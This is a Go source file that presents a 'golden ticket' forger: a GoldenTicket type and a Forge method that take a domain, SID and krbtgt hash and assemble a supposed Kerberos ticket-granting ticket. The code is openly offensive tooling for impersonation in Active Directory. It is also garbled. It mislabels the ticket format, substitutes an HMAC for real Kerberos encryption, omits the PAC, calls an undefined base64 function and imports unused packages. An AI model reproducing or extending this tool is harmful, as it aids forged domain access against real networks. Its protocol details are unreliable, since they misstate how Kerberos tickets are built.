package kerberos

import (
"crypto/hmac"
"crypto/rand"
"crypto/sha256"
"encoding/binary"
"encoding/hex"
"fmt"
"time"
)

type GoldenTicket struct {
Domain      string
Username    string
DomainSID   string
KrbtgtHash  string
}

func NewGoldenTicket(domain, username, domainSID, krbtgtHash string) *GoldenTicket {
return &GoldenTicket{
Domain:     domain,
Username:   username,
DomainSID:  domainSID,
KrbtgtHash: krbtgtHash,
}
}

func (g *GoldenTicket) Forge() (string, error) {
// Build TGT structure
// KERB-V4-TICKET structure
ticket := make([]byte, 0)

// Version (5)
ticket = append(ticket, 0x05)

// Ticket type (0x01 for TGT)
ticket = append(ticket, 0x01, 0x00, 0x00, 0x00)

// Realm (domain)
realmBytes := []byte(g.Domain)
ticket = append(ticket, byte(len(realmBytes)))
ticket = append(ticket, realmBytes...)

// SName (principal)
// Principal name type (NT-PRINCIPAL - 1)
ticket = append(ticket, 0x01, 0x00)
snameBytes := []byte("krbtgt")
ticket = append(ticket, byte(len(snameBytes)))
ticket = append(ticket, snameBytes...)

// Pad to align
for len(ticket)%4 != 0 {
ticket = append(ticket, 0x00)
}

// Encrypted part with krbtgt hash
// For simplicity, we'll use HMAC-SHA256 with krbtgt hash
key, _ := hex.DecodeString(g.KrbtgtHash)
h := hmac.New(sha256.New, key)
h.Write(ticket)
encryptedPart := h.Sum(nil)

// Build final ticket
finalTicket := make([]byte, 0)
finalTicket = append(finalTicket, ticket...)
finalTicket = append(finalTicket, encryptedPart...)

return base64Encode(finalTicket), nil
}

func (g *GoldenTicket) SetExpiry(days int) int64 {
return time.Now().Add(time.Duration(days) * 24 * time.Hour).Unix()
}
